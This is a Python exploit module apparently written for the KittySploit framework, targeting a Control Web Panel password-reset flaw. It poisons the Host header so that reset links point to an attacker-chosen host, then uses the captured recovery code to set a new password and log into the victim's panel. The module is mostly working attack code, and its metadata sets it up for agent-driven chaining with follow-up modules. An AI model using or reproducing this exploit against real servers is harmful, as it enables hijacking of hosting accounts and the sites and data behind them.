#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-124020 — CWP Host header password-reset poisoning."""

from kittysploit import *
from lib.protocols.http.control_web_panel import Control_web_panel
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Control_web_panel):
    __info__ = {
        "name": "CWP CVE-2026-124020 reset-link poisoning",
        "description": (
            "Queues lostpass mail with poisoned Host; reset with captured idsession."
        ),
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-124020"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-124020"],
        "tags": ["cwp", "password-reset", "takeover", "cve-2026-124020", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["auth_bypass", "account_takeover"],
            "chain": {"suggested_followups": ["scanner/http/cwp_cve_2026_124020_detect"]},
        },
    }

    port = OptPort(2083, "CWP panel port", required=False)
    username = OptString("", "Panel username", required=True)
    email = OptString("", "Account contact email", required=True)
    attacker_host = OptString(
        "",
        "Host header for poisoned reset link (attacker:port)",
        required=True,
    )
    idsession = OptString("", "Captured recovery code (skip poison)", required=False)
    new_password = OptString("Pwn3d!cve2026", "New password to set", required=False)

    def run(self):
        user = str(self.username or "").strip()
        mail = str(self.email or "").strip()
        if not user or not mail:
            print_error("Set USERNAME and EMAIL")
            return False
        if not self.cwp_lostpass_check(user, mail):
            print_error("Username/email rejected by lostpass oracle")
            return False
        code = str(self.idsession or "").strip()
        if not code:
            host = str(self.attacker_host or "").strip()
            if not host:
                print_error("Set ATTACKER_HOST or IDSESSION")
                return False
            if not self.cwp_lostpass_poison(user, mail, host):
                print_error("Poisoned lostpass not queued")
                return False
            print_success(f"Reset mail queued (Host: {host})")
            print_status("Capture idsession on your listener, then rerun with IDSESSION")
            return True

        pwd = str(self.new_password or "")
        if self.cwp_reset_password(code, pwd):
            print_success("Password reset submitted")
        panel = self.cwp_login(user, pwd)
        if panel:
            print_success(f"Logged in — panel path {panel}")
            self.set_info(severity="critical", cve="CVE-2026-124020", panel=panel)
            return True
        print_warning("Reset/login inconclusive")
        return bool(code)